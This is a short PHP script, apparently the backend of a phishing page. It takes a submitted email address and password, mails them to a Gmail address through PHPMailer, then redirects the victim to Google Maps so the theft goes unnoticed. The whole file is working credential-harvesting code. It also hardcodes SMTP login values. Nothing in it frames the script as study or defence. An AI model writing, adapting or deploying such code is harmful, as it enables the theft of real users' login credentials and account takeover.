<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $to = 'laboratorioganso@gmail.com'; // Seu endereço de e-mail
    $subject = 'Novo Login';
    $message = 'E-mail: ' . $email . "\r\n" . 'Senha: ' . $password;
    $headers = 'From: no-reply@example.com' . "\r\n" . 'Reply-To: no-reply@example.com';

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'sandbox.smtp.mailtrap.io';
        $mail->SMTPAuth = true;
        $mail->Username = '9a85fb5eab83ca';
        $mail->Password = '8658069f8a2ec5';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 2525;

        $mail->setFrom('no-reply@example.com', 'Mailer');
        $mail->addAddress($to);

        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body = $message;

        $mail->send();
        header("Location: https://maps.google.com");
        exit();
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
